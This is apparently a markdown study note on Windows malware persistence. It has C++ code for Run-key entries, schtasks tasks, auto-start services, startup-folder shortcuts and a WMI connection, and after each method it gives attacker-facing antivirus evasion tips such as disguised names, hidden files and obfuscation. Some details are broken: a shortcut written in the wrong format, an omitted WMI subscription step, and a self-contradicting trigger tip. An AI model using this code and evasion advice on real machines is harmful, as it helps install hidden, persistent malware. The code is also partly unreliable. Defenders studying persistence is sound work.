# Index 
- [[3. Common Malware Techniques]]
	- [[3.1 Process Injection Techniques]]
	- [[3.2 Persistence Mechanisms]]
	- [[3.3 Hooking Windows APIs]]
	- [[3.4 Packing & Encryption]]

# Registry-based Persistence
Windows registry is a prime target for malware to achieve persistence due to the wide variety of locations where executables can be configured to run automatically on system startup.

#### Common Registry Keys for Persistence
1. Run and RunOnce Keys:
   - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
   - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
   - These keys allow programs to execute automatically upon user login.

#### Example: Adding an Entry to the `Run` Key in C++
```cpp
#include <windows.h>
#include <iostream>

int main() {
    HKEY hKey;
    const char* keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "MyMalware";
    const char* exePath = "C:\\path_to_malicious_executable.exe";

    // Open the registry key
    if (RegOpenKeyEx(HKEY_CURRENT_USER, keyPath, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        std::cerr << "Failed to open registry key." << std::endl;
        return -1;
    }

    // Set the value for the executable to run at startup
    if (RegSetValueEx(hKey, valueName, 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1) != ERROR_SUCCESS) {
        std::cerr << "Failed to set registry value." << std::endl;
        RegCloseKey(hKey);
        return -1;
    }

    std::cout << "Persistence established!" << std::endl;

    // Cleanup
    RegCloseKey(hKey);
    return 0;
}
```

##### AV Evasion Strategies
- Registry Obfuscation: Obfuscate or encrypt the values added to the registry to prevent signature-based detection.
- Randomized Key Names: Instead of using common or easily identifiable key names like "MyMalware," generate random names to avoid drawing attention.
- Alternative Registry Locations: Consider less obvious registry locations, such as:
  - `HKEY_CURRENT_USER\Software\Classes\exefile\shell\open\command`
  - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components`

# Scheduled Task Persistence
Scheduled tasks are another popular method of persistence. By creating a scheduled task, malware can execute at a specified interval or when certain triggers are met (e.g., system startup or user login).

#### Creating a Scheduled Task
Scheduled tasks can be created using the `Task Scheduler` API or the command-line tool `schtasks`. A common persistence method is to create a task that runs at every user login or system startup.

#### Example: Creating a Scheduled Task in C++
```cpp
#include <windows.h>
#include <iostream>

int main() {
    const char* taskName = "MyPersistentTask";
    const char* exePath = "C:\\path_to_malicious_executable.exe";

    std::string command = "schtasks /create /tn " + std::string(taskName) + " /tr " + std::string(exePath) + " /sc onlogon";
    system(command.c_str());

    std::cout << "Scheduled task created for persistence!" << std::endl;
    return 0;
}
```

##### AV Evasion Strategies
- Trigger Modification: Instead of triggering the task on system startup (which AVs often monitor), schedule it to run at more obscure times, such as system idle (`/sc idle`) or when a user logs on (`/sc onlogon`).
- Task Obfuscation: Use benign-looking task names or descriptions, such as mimicking system or software update tasks to blend in with legitimate entries.

# Service-based Persistence
Malware can create or modify services to achieve persistence. By setting up a malicious executable as a service, malware can ensure it is automatically launched when the system boots.

#### Creating a New Service
Services run with higher privileges, making them a prime target for attackers seeking persistence. Services can be created and managed using the Windows Service Control Manager (SCM) API.

#### Example: Creating a Malicious Service in C++
```cpp
#include <windows.h>
#include <iostream>

int main() {
    const char* serviceName = "MaliciousService";
    const char* exePath = "C:\\path_to_malicious_executable.exe";

    // Open Service Control Manager
    SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scmHandle) {
        std::cerr << "Failed to open Service Control Manager." << std::endl;
        return -1;
    }

    // Create the malicious service
    SC_HANDLE serviceHandle = CreateService(
        scmHandle,
        serviceName,
        serviceName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,  // Automatically start the service at boot
        SERVICE_ERROR_NORMAL,
        exePath,
        NULL, NULL, NULL, NULL, NULL);

    if (!serviceHandle) {
        std::cerr << "Failed to create service." << std::endl;
        CloseServiceHandle(scmHandle);
        return -1;
    }

    std::cout << "Malicious service created!" << std::endl;

    // Cleanup
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
    return 0;
}
```

##### AV Evasion Strategies
- Service Naming: Name the service similarly to legitimate services. For example, "Windows Update Service" or "Backup Scheduler" could be used to avoid detection.
- Delayed Start: Use `SERVICE_DEMAND_START` or `SERVICE_DELAYED_AUTO_START` to delay service execution until the system is idle, minimizing the chance of detection during startup scans.
- Modify Existing Services: Instead of creating a new service, modify existing legitimate services to point to the malicious executable or DLL.

# Startup Folder Persistence
A simple yet effective persistence method is placing a shortcut to the malicious executable in the Startup folder. Programs in this folder are automatically launched when a user logs in.

#### Adding a Shortcut to the Startup Folder
- For the current user: `C:\Users\<User>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
- For all users: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`

#### Example: Adding a Shortcut in C++
```cpp
#include <windows.h>
#include <shlobj.h>
#include <iostream>

int main() {
    // Get path to the Startup folder
    char startupPath[MAX_PATH];
    if (SHGetSpecialFolderPathA(NULL, startupPath, CSIDL_STARTUP, FALSE)) {
        std::string shortcutPath = std::string(startupPath) + "\\MyMalware.lnk";
        std::string exePath = "C:\\path_to_malicious_executable.exe";

        // Create a shortcut (simplified example, typically done via IShellLink interface)
        std::ofstream shortcut(shortcutPath);
        shortcut << "[InternetShortcut]\nURL=file:///" << exePath;
        shortcut.close();

        std::cout << "Shortcut added to Startup folder for persistence!" << std::endl;
    } else {
        std::cerr << "Failed to get Startup folder path." << std::endl;
    }

    return 0;
}
```

##### AV Evasion Strategies
- Hidden Files: Set the shortcut as a hidden file to avoid user detection.
- Mimic Legitimate Programs: Name the shortcut after legitimate programs that commonly run at startup (e.g., "AdobeUpdater" or "MicrosoftOneDrive").

# WMI Event Subscription
Windows Management Instrumentation (WMI) provides another avenue for malware to establish persistence by creating an event subscription. The malware can subscribe to specific system events, such as system startup or user logon, and automatically trigger code execution.

#### Setting up WMI Persistence
Using the WMI command-line utility (`wmic`), you can set up an event filter and consumer that will execute malicious code on a specific event.

#### Example: WMI Persistence in C++ (using WMI COM Interfaces)
```cpp
#include <wbemidl.h>
#include <windows.h>
#include <iostream>

#pragma comment(lib, "wbemuuid.lib")

int main() {
    HRESULT hres;

    // Initialize COM library
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        std::cerr << "Failed to initialize COM library." << std::endl;
        return -1;
    }

    // Set security levels for the process
    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hres)) {
        std::cerr << "Failed to initialize security." << std::endl;
        CoUninitialize();
        return -1;
    }

    // Obtain a pointer

 to IWbemLocator to connect to WMI
    IWbemLocator *pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc);
    if (FAILED(hres)) {
        std::cerr << "Failed to create IWbemLocator." << std::endl;
        CoUninitialize();
        return -1;
    }

    // Connect to WMI namespace
    IWbemServices *pSvc = NULL;
    hres = pLoc->ConnectServer(BSTR(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (FAILED(hres)) {
        std::cerr << "Failed to connect to WMI namespace." << std::endl;
        pLoc->Release();
        CoUninitialize();
        return -1;
    }

    // Use WMI to create event filters and consumers (for persistence)
    // For simplicity, this is omitted, but the logic involves creating __EventFilter and __EventConsumer

    // Cleanup
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();
    return 0;
}
```

##### AV Evasion Strategies
- Obfuscate Queries: Ensure that the WMI queries or subscriptions you create appear legitimate. Mask them by using system-related filters or making the subscription look like regular administrative tasks.
- Avoid Suspicious Events: Rather than using obvious events like `__InstanceCreationEvent` (for process creation), consider subtler events such as system performance counters or idle events.

# Startup Script/Group Policy Persistence
Administrators often use group policy objects (GPOs) to configure systems. Malware can modify logon scripts or startup scripts to achieve persistence by adding malicious executables to scripts that are executed when users log on or systems boot up.

#### Example: Modifying a Logon Script in a Domain Environment
Malware running with sufficient privileges can modify existing logon scripts to include the execution of a malicious payload.

##### AV Evasion Strategies
- Obfuscate the Payload: Obfuscate the modifications to the script to avoid detection.
- Target Scripting Languages: Embed the malicious payload in VBScript, PowerShell, or batch files that are less likely to be scanned rigorously by AV engines.
